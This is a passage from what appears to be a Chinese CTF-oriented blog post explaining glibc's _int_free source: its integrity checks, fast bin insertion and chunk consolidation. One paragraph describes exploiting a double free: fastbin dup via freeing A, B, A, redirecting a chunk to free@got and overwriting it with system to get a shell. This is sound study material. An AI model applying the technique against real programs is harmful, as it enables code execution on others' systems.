p);</span><br></pre></td></tr></table></figure><p>又有一个<code>check</code></p><ol><li><code>size &lt; MINSIZE</code>：如果<code>size</code>还比<code>MINSIZE</code>要小，那肯定<code>size</code>肯定出错了。</li><li><code>!aligned_OK (size)</code>：<code>chunk size</code>也要对齐，但是这个<code>check</code>一般不会被触发，因为再取出<code>chunk size</code>的时候就会把最低位与掉。</li></ol><p>然后它这里需要<code>check</code>一下这个<code>free</code>的<code>chunk</code>是正在使用的，怎么<code>check</code>呢，那就肯定是下一个<code>chunk</code>的<code>prev_inuse</code>位为0啦，具体的实现函数是这样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_inuse_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mchunkptr next;</span><br><span class="line"></span><br><span class="line">  do_check_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">/* mmapped chunks have no next/prev */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check whether it claims to be in use ... */</span></span><br><span class="line">  assert (inuse (p));</span><br><span class="line"></span><br><span class="line">  next = next_chunk (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... and is surrounded by OK chunks.</span></span><br><span class="line"><span class="comment">     Since more things can be checked with free chunks than inuse ones,</span></span><br><span class="line"><span class="comment">     if an inuse chunk borders them and debug is on, it&#x27;s worth doing them.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse (p))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Note that we cannot even look at prev unless it is not inuse */</span></span><br><span class="line">      mchunkptr prv = prev_chunk (p);</span><br><span class="line">      assert (next_chunk (prv) == p);</span><br><span class="line">      do_check_free_chunk (av, prv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (next == av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">      assert (prev_inuse (next));</span><br><span class="line">      assert (chunksize (next) &gt;= MINSIZE);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!inuse (next))</span><br><span class="line">    do_check_free_chunk (av, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多的也不说了，相信都能理解的，根据自身指针和自身大小就可以很容易知道下一个<code>chunk</code>的位置，然后检测一下<code>prev_inuse</code>位判断我当前<code>chunk</code>是否被使用。</p><h3 id="fast-bin范围的处理"><a href="#fast-bin范围的处理" class="headerlink" title="fast bin范围的处理"></a>fast bin范围的处理</h3><h4 id="fast-bin的check"><a href="#fast-bin的check" class="headerlink" title="fast bin的check"></a>fast bin的check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">    &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">        of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">        after getting the lock.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">        || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! have_lock)</span><br><span class="line">        &#123;</span><br><span class="line">            (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个大条件很明显就是判断这个<code>free</code>的<code>chunk</code>是否为<code>fast bin</code>，后面又判断且这个<code>chunk</code>的后一个<code>chunk</code>不为<code>top_chunk</code>，虽然根据自己的经验好像判断后一个不为<code>top_chunk</code>没什么意义。</p><p>然后满足的话就是一个<code>check</code>，判断<code>size</code>是否小于<code>MINSIZE</code>或者是<code>size&gt;=system_mem</code>。就是排除一些不合理的情况然后会重新尝试拿分配器的锁然后再做一个判断，如果刚刚那个条件还是成立的话那就说明<code>size</code>真的被改成了非法数值，那就报错退出。</p><p>如果进来了但是没有执行报错呢，说明可能多线程有点问题，就释放这个<code>arena</code>的锁，这里我多线程不是很好也不知道该如何解释，但是这个应该不是主要分析的，咱们平时做题基本也不会遇到多线程编程的题目。</p><h4 id="free-fast-bin"><a href="#free-fast-bin" class="headerlink" title="free fast bin"></a>free fast bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">        (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">        size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">        only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">            old_idx = fastbin_index(chunksize(old));</span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它先执行了一个<code>free_perturb</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//free_perturb</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实跟前面<code>malloc</code>那个函数差不多，就是看你有没有设置那个值，如果设置了就在<code>free</code>之前把堆块进行<code>memset</code>清空，但是不一样的是，<code>perturb</code>中<code>memset</code>第二个参数是要根据你设置的值再异或一个<code>0xff</code>的。</p><p>然后是用<code>set_fastchunks(av)</code>宏定义去初始化<code>fast bin</code>。之后根据<code>size</code>算出下标找到对应的<code>fast bin</code>，之后就应该把这个<code>free</code>的<code>chunk</code>链入<code>fast bin</code>里面。这里还有一个<code>check</code>，如果<code>bin</code>顶部的那个<code>chunk</code>和这次要<code>free</code>的<code>chunk</code>相等的话，就报错退出，这也就是我们熟知的<code>double free</code>漏洞了。那么说到<code>double free</code>我们来看看<code>double free</code>能造成什么后果。</p><p>假如我要<code>free</code>的<code>chunk</code>是A，我第一次<code>free</code> A，<code>bin</code>为空，链入其中，<code>fast bin</code>中多了一个A。第二次<code>free</code> A，A再次被加入<code>fast bin</code>中，然后会导致产生一个自己指向自己的指针。<code>fast bin</code>中的情况就是两个A，<code>A-&gt;A</code>。此时我申请一个和A一样大的<code>chunk</code>，A被申请走，<code>fast bin</code>中还剩下一个A，但是此时用户手里有一个A，<code>fast bin</code>中也有一个A。用户可以直接编辑A的指针域，比如我让它指向了<code>got</code>表中的<code>free</code>函数。那么此时<code>fast bin</code>中的情况就是<code>A-&gt;free@got</code>。然后我再次申请和A一样大小的<code>chunk</code>，A被取出来，<code>fast bin</code>中剩下<code>free@got</code>。那么我第三次申请就得到了在<code>free@got</code>那边的<code>chunk</code>，然后假如我偷偷修改一下<code>free@got</code>为<code>system</code>，那就能轻松<code>get shell</code>了。这里可以看到，<code>free@got</code>这个指针我是能任意编辑的，也就是说我想申请到哪都不是问题，这样我就能任意地址写了。</p><p>你可能有点疑问，我<code>free</code>了2个堆块，怎么出来3个堆块。那我们想想，如果遍历一个单链表，你怎么判断结尾？咱们一般都是判断<code>x-&gt;next!=NULL</code>但是原来那边A的<code>next</code>指针确实是<code>NULL</code>，但是你把指针改过了，就会认为<code>fast bin</code>还没有空。</p><p>但是实际情况往往没有那么简单，前面我们说过了，<code>malloc</code>取出一个<code>fast bin</code>的<code>chunk</code>的时候，会判断它<code>chunk</code>的<code>size</code>是否等于当前我要申请的<code>size</code>，如果不是就会报错退出。所以<code>double free</code>在利用的时候还是没那么”任意”的，而且这里也不允许你直接<code>double free</code>，但是直接不能不代表不能间接<code>double free</code>，如果我先<code>free</code>一个A，<code>free</code>一个B之后再<code>free</code>一个A，那么我再申请到A的时候修改A的指针域一样可以劫持，并且可以绕过这里的检测。</p><p>然后如果过了检测，那就将这个<code>chunk</code>假如<code>fast bin</code>的顶部。这里就是一个单链表的插入，具体自己写的话应该是这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=av-&gt;fastbinY[index]-&gt;fd;</span><br><span class="line">av-&gt;fastbinY[index]-&gt;fd=p;</span><br></pre></td></tr></table></figure><p>源码中与这个略微有点不一样，效果是一样的。所以也可以看出来这个是后进先出，只在<code>fast bin</code>的一端插入删除，跟栈差不多。</p><p>末尾还有一个<code>check</code>，但是这个<code>check</code>通常不会被触发，有会的师傅也请帮帮，因为是真的不知道hhh。</p><h4 id="free非fast-bin"><a href="#free非fast-bin" class="headerlink" title="free非fast bin"></a>free非fast bin</h4><p>这里分了两种情况，如果<code>chunk</code>是<code>mmap</code>分配的话那就调用<code>munmap_chunk</code>函数去<code>free</code>这个<code>chunk</code>，这个情况不属于我们主要要分析的内容，所以那边的else分支我们跳过，只分析非<code>mmap</code>分配的<code>chunk</code>。</p><h4 id="第一部分：锁"><a href="#第一部分：锁" class="headerlink" title="第一部分：锁"></a>第一部分：锁</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    assert (locked);</span><br><span class="line">    (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这我熟，就是在用一个分配器的时候先加锁，用完了释放就行了。这主要是为了防止多个线程之间发生竞争，虽然我看过多线程是说有独立的堆空间，但是假设堆块正常使用，正常分配，不去做指针的越界操作，那么同一个分配器分配给不同的线程用也是完全可行的，我只拿到我自己用的指针在合法范围内用一样不会造成竞争的现象。以上出于我自己的大胆推测，如有不对还请指正。</p><h4 id="第二部分：free之前的各种check"><a href="#第二部分：free之前的各种check" class="headerlink" title="第二部分：free之前的各种check"></a>第二部分：free之前的各种check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<span class="comment">//后面块的prev in use标志位为0时发生free</span></span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><p>好，我们来看第一个<code>check</code>。</p><ol><li><code>p == av-&gt;top</code>：<code>free</code>的<code>chunk</code>为<code>top_chunk</code>。</li></ol><p><code>top_chunk</code>和其它<code>bin</code>一样，都是出于待分配状态，<code>top_chunk</code>永远不会被使用。因为如果切割了<code>top_chunk</code>，<code>top_chunk</code>马上会下移，所以正常分配是绝对不会分配到现在的<code>top_chunk</code>指针的，所以当你尝试<code>free</code> <code>top_chunk</code>的时候，就会报这个错。</p><p>第二个<code>check</code></p><ol><li><code>contiguous (av)</code>：检查分配器上的<code>flags</code>，其实我也不知道是干嘛的(捂脸。</li><li><code>(char *) nextchunk&gt;=(char *) av-&gt;top + chunksize(av-&gt;top)</code>：然后这个条件呢就是说如果我这个<code>chunk</code>的下一个<code>chunk</code>居然在<code>top_chunk</code>之后，那肯定就也有错了。</li></ol><p>第三个<code>check</code></p><ol><li><code>!prev_inuse(nextchunk)</code>：就是说如果后一个<code>chunk</code>的<code>prev_inuse</code>为0，也就是说这个<code>chunk</code>处于被<code>free</code>的状态，那么这一次<code>free</code>就有可能造成<code>double free</code>了，就会报错。</li></ol><p>第四个<code>check</code></p><ol><li><code>nextchunk-&gt;size &lt;= 2 * SIZE_SZ</code>：如果下一个<code>chunk</code>的<code>size</code>有问题一样也要报错退出，这里说的就是下一个<code>chunk</code>的<code>size</code>小于<code>MINSIZE</code>的情况，free的话因为会涉及到chunk的向前合并或者向后合并，因此对前后堆块的检查都很严格。</li><li><code>nextsize &gt;= av-&gt;system_mem</code>：<code>size</code>超出系统分配给分配器的内存，那也报错。</li></ol><h4 id="第三部分：free之后向前合并"><a href="#第三部分：free之后向前合并" class="headerlink" title="第三部分：free之后向前合并"></a>第三部分：free之后向前合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就提到了我们之前讲到的一个问题，我一个堆块怎么向前合并，也就是如何准确地找到前一个堆块。向前合并的时候我先判断一下前一个<code>chunk</code>是否被使用，如果不被使用那么就要和前面的<code>chunk</code>合并。这里我就可以通过<code>prev_size</code>位去找到这个堆块，用自身指针减去<code>prev_size</code>就得到了前一个<code>chunk</code>的指针。</p><p>这里需要注意，因为前面那个<code>chunk</code>可能在<code>large bin</code>,<code>small bin</code>或者是<code>unsorted bin</code>的链表当中，那么我就得先把它从这些<code>bin</code>里面解脱出来，也就是<code>unlink</code>操作，合并之后成为一个新的<code>chunk</code>然后再加入<code>unsorted bin</code>。</p><p>这里向前合并的操作呢应该也没有很复杂，就是改个<code>size</code>然后把<code>free</code>的指针指到前面去，相当于是要<code>free</code>合并后的<code>chunk</code>了。然后<code>unlink</code>把前面的<code>chunk</code>在<code>bin</code>中删除。</p><h4 id="第四部分：free之后向后合并"><a href="#第四部分：free之后向后合并" class="headerlink" title="第四部分：free之后向后合并"></a>第四部分：free之后向后合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;fd = fwd;</span><br><span class="line">    p-&gt;bk = bck;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bck-&gt;fd = p;</span><br><span class="line">    fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">    check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个特判后面的<code>chunk</code>是否为<code>top_chunk</code>，<code>top_chunk</code>的情况就非常简单，因为合并的<code>chunk</code>并不在任何<code>bin</code>里面，<code>top_chunk</code>后面也没有堆块不需要设置标志位。只需要改一下<code>top_chunk</code>的<code>size</code>，然后改一下指针，就完了。</p><p>那么我们分析不是<code>top_chunk</code>的情况，首先我先获取一下下一个<code>chunk</code>的是否被使用，如果没有被使用，那么把后面的<code>chunk</code>就先<code>unlink</code>了，然后自己<code>chunk</code>的<code>size</code>加上后面那个<code>chunk</code>的<code>size</code>成为新的<code>chunk</code>。否则，我就直接清空后面<code>chunk</code>的<code>prev_inuse</code>位，就是表示我这个<code>chunk</code>已经不被使用了。好了之后那就是把这个<code>chunk</code>链入<code>unsorted bin</code>。这里还有一个<code>check</code>，跟<code>malloc</code>那个一样，，后面基本也都一样了，就不细讲了，链入，设置标记为，设置<code>prev_size</code>，如果不在<code>small 